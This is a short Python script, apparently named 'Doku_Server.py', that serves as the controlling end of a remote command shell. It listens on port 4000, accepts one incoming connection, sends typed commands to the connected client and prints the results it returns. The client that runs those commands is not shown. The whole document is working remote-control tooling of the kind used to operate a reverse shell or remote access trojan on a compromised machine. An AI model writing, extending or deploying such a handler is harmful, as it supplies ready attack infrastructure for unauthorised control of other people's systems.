import getpass
import socket
import sys

target_port = 4000

try:
    target_ip = sys.argv[1]

except:
    print('SYNTAX ERROR: python3 Doku_Server.py target_ip')
    sys.exit(1)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.bind((target_ip, target_port))

print('---------- Doku ----------\n')
print('[+] Started server')

connection.listen(1)
print('[+] Waiting for connections press ctrl-c to stop')

try:
    client, address = connection.accept()
    
except KeyboardInterrupt:
    sys.exit()

print('[+] New connection from ' + str(address) + '\n')

while True:
    command = input(getpass.getuser() + '@Doku: ')

    if command == 'exit':
        client.sendall('exit'.encode('utf-8'))
        client.close()
        connection.shutdown(1)
        break

    client.sendall(command.encode('utf-8'))
    result_length = int(client.recv(1024).decode('utf-8'))
    result = client.recv(result_length).decode('utf-8')

    print(result)